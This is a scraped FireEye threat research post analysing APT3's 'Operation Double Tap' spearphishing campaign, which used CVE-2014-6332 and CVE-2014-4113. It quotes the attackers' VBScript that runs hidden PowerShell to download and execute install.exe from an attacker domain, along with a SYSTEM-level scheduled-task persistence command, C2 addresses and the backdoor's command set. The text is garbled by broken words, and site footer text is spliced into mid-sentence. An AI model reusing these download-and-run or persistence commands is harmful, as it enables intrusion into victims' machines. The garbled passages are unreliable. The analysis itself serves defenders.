{
    "title": "operation double tap _ fireeye inc",
    "text": "Threat Research Operation Do uble Tap novembe r 21, 2014 | by ned Moran, Mike Scott , Mike Oppenheim , Joshua Homan EXPLOITS  aDVanCED MaLWaR E  THREaT RESEaRCH aPT3 (also known as UPS), the acto rs responsible for Operation Clan destine Fox  has quietly contin ued to send waves of spearphishing me ssages over the pa st few month s. This actor initiate d their most recent campaign on novembe r 19, 2014 targeting m ultiple organizations. The attacke r leveraged multiple exploit s, targeting both CVE-2014-6332  and CVE-2014-4113. CVE-2014-6332  was disclosed publicly on 2014-11-11 and is a Windows OLE automation a rray Remote Co de Execution vulnerability. CV E-2014-4113 is a privilege e scalation v ulnerability that was disclosed publicly on 2014-10-14. The use of CV E-2014-6332  is notable, a s it demonstrates that m ultiple cla sses of acto rs, both c riminal an d aPT alike, have no w incorporated this exploit into thei r toolkits. Further, the use of both of the se two known vulnerabilities in tandem is notable fo r aPT3. This actor is historically kno wn for leveraging zero-day vulnerabilities in widespread but infrequent phishing campaign s. The use of kno wn exploit s and more frequent attacks may in dicate both a shift in strategy an d operational tempo fo r this group. The Spea rphish The body of the me ssage is below: One Month' s Free Membe rship for The PLaYBOY ClUB 1080 P HD VIDEOS 100,000 PHOTOS 4, 000  MODELS nude Celeb rities,Playmate s,Cybergirls & More! Click hxxp://join.playboy splus.com/signup/ To Get a F ree Plus Membe r now & never Miss anothe r Update. Your Membe r referrals must remain active. If anyone getting \"Promotion not available\" fo r 1 month f ree membe rship, you might get the i ssue up to 48 hrs once yo ur membe rship is expired and make sure to Clea r out cookie s or use anothe r browser or use anothe r PC. The webpage containe d both CV E-2014-6332  exploit co de and a VBSc ript that invoke d PowerShell on the affected users’ system to download the belo w payloa d:     function runmumaa()     On Error Resume Next     set shell=createobject(\"Shell.Application\")     shell.ShellExecute \"powershell.exe\",\"-NoLogo -NoProfile                 -NonInteractive -WindowStyle Hidden ( New-Object                         “System.Net.WebClient”).DownloadFile(“http://www.playboysplus.com        /install/install.exe”,”install.exe”);Invoke-Item install.exe\", \"\",         \"open\", 1     end function The CV E-2014-6332  exploit co de seen in thi s incident is derived from the co de published at http://www .exploit- db.com/exploit s/35230 /, which has also been inco rporated in the Meta sploit project. The Do wnloader after the exploit o r script exec utes, the system downloads install.exe,  which has the follo wing meta data: MD5             5a0c4e1925c76a959ab0588f683ab437 Size            46592 bytes Compile Time    2014-11-19 08:55:10Z Import Hash     6b8611f8148a6b51e37fd68e75b6a81c The file install.exe  attempt s to write two files (doc.exe an d test.exe) to the ha rd-coded path “C:\\Users\\Public”,  which fail s on Win dows XP beca use that path i s not present by default. The first dropped file, doc.exe,  contain s the CV E-2014-4113 exploit an d then attempt s to exec ute test.exe  with the elevate d privileges. These files have the follo wing meta data: doc.exe (x86): MD5           492a839a3bf9c61b7065589a18c5aa8d Size          12288 bytes Import Hash   9342d18e7d315117f23db7553d59a9d1   doc.exe (x64): MD5           744a17a3bc6dbd535f568ef1e87d8b9a Size          13824 bytes Compile Time  2014-11-19 08:25:45Z Import Hash   2fab77a3ff40e4f6d9b5b7e813c618e4   test.exe: MD5           5c08957f05377004376e6a622406f9aa Size          11264 bytes Compile Time  2014-11-18 10:49:23Z Import Hash   f34d5f2d4577ed6d9ceec516c1f5a744   These payloa d files also have inte resting PDB debug strings. install.exe:     c:\\Users\\aa\\Documents\\Visual Studio 2008\\Projects\\MShell\\Release        \\MShell.pdb   doc.exe:     c:\\Users\\aa\\Documents\\Visual Studio 2008\\Projects\\4113\\Release            \\4113.pdb   test.exe:     C:\\Users\\aa\\Documents\\Visual Studio 2010\\Projects\\MyRat\\Client\\Client      \\obj\\x86\\Release\\Client.pdb   The mo st interesting PDB string is the “4113.pdb,”  which appea rs to reference CV E-2014-4113. This CVE is a local kernel vulnerability that, with successful exploitation, would give any user SYSTEM access on the machine. The mal ware component, test.exe , uses the Win dows comman d \"cmd.exe\" /C whoami”  to verify it is running with the elevate d privileges of “System” an d creates persistence by c reating the follo wing scheduled task:     schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON     /ru \"System\" When exec uted, the mal ware first establishes a SOCKS 5 connection to 192.157.198.103 using TCP po rt 1913. The malware sends the SOCKS 5 connection request \"05 01 00\"  and verifies the server response starts with \"05 00\". The mal ware then requests a connection to 192.184.60.229 on TCP po rt 81 using the comman d \"05 01 00 01 c0  Email Up dates Information an d insight on to day's advanced threats from FireEye. SHaRE Recent Po sts 09 Mar 2020 24 Feb 2020 20 Feb 2020 RSS FEED: STaY CO nnECTEDFirst name Last name Email address Company name Threat Research Blog FireEye Stories Blog Industry Perspective s Blog Yes, I would like to receive communication s from FireEye. Please read more about our information collection an d use. SUBSCR IBE Crescendo: Real Time Event Vie wer for macOS   Ransomware again st the Machine: How adversaries are Learning to Disrupt Industrial Production by Targeting IT and OT  M-Trends 2020 : Insights From the Front Line s   Home  FireEye Blog s Threat Research  novembe r 2014 Threat Research Blog Po sts  Operation Do uble Tap     COnTaCT US  REPORT a n InCIDEnT Solutions Services Customers Partners Resources Company   PREVIOUS POST nEXT POSTb8 3c e5 00 51\"  and verifies that the fi rst two bytes from the server are \"05 00\" (c0 b8 3c e5 is the IP address and 00 51 is the po rt in network byte o rder). Once the connection to the server is established, the mal ware expect s a message containing at lea st three byte s from the server. These first three byte s are the comman d identifier. The follo wing comman ds are supported by the mal ware: Comman d IDDescription 00 00 00Content afte r comman d ID is written to: C:\\Users\\ [Username]\\appData\\Local\\Temp\\notepa d1.exe 00 00 01Deletes the file s: C:\\Users\\ [Username]\\appData\\Local\\Temp\\notepa d.exe C:\\Users\\ [Username]\\appData\\Local\\Temp\\ne wnotepa d.exe 00 00 02 Malware exits 00 00 03Malware downloads the URL that follo ws the comman d ID. The file i s saved to: C:\\Users\\ [Username]\\appData\\Local\\Temp\\notepa d.exe 00 00 04Content afte r comman d ID is written to: C:\\Users\\ [Username]\\appData\\Local\\Temp\\notepa d2.exe 00 00 05The files notepa d1.exe an d notepa d2.exe are concatenate d togethe r and written to C:\\U sers\\ [Username]\\appData\\Local\\Temp\\ne wnotepa d.exe and executed 00 00 06The content s of the follo wing file i s sent to the server: C:\\Users\\ [Username]\\appData\\Local\\Temp\\note.txt 00 00 07The string follo wing the comman d ID is executed using \"cm d /C\" and results are sent to server   Links to aPT 3 On Octobe r 28, we observed aPT3 sending out spearphishing me ssages containing a comp ressed executable attachment. The deflated exe was a variant of the same downloader described above an d connecte d to 198.55.115.71  over port 1913 via SOCKS 5 proxy. The secondary payloa d in that ca se was detected as Backdoor.aPT.CookieC utter (aka Pi rpi) and also name d newnotepa d.exe (MD5 8849538ef1c3471640230605c2623c67)  and connecte d to the kno wn aPT3 domains:     inform.bedircati[.]com     pn.lamb-site[.]com     210.109.99.64 The 192.184.60.229  IP address seen in thi s current campaign al so hosts securitywap[.]com  – anothe r known domain referenced in our Operation Clan destine Fox blog. DOMaIn FIRST SEEn LaST S EEnIP aDDR ESS securitywap.com 2014-11-172014-11-20192.184.60.229 www .securitywap.com 2014-11-172014-11-20192.184.60.229 In addition, the join.playboysplus[.]com  exploit an d payloa d delivery site resolves to 104.151.248.173. This IP has hosted other domains used by aPT 3 in past campaign s: DOMaIn FIRST SEEn LaST S EEnIP aDDR ESS join.playboy splus[.]com 2014-11-212014-11-21104.151.248.173 walterclean[.]com 2014-11-182014-11-20104.151.248.173 www .walterclean[.]com 2014-11-182014-11-20104.151.248.173 as we discussed in our previous blog detailing previous aPT3 activity , the walterclean[.]com  served as a Plugx/Kaba comman d and control server. Conclusion although aPT 3 is well known for employing zero-day exploit s in their attacks, recent activity ha s demonstrated that they will also attack ta rgets with known exploit s or social enginee ring. Since Ope ration Clan destine Fox, we have ob served this actor execute multiple attack s that did not rely on zero-day exploit s. The combination of thi s sustained operational tempo an d lack of zero-day exploit s may indicate that thi s group has change d strategy an d has decided to attack mo re frequently an d does not have steady access to zero-day exploit co de. no matte r the strategy, thi s actor has shown an ability to ope rate successfully. IOCs for this threat can be fo und here.   Company Why Fi reEye? Customer Stories Careers Certification s and Compliance Investor Relation s Supplier Documents news and Events  newsroom Press Releases Webina rs Events awards and Honors Email Preferences Technical S upport Incident? Report Security Issue Contact S upport Customer Portal Communities Documentation Po rtal FireEye Blog s Threat Research FireEye Stories Industry Perspective s Threat Map View the Late st Threats Contact U s +1 877-347-3393   Stay Connecte d  Copyright   2020  FireEye, Inc. all rights reserved.  Privacy & Cookie s Policy  | Privacy Shiel d | Legal Doc umentationSite Lang uage English  "
}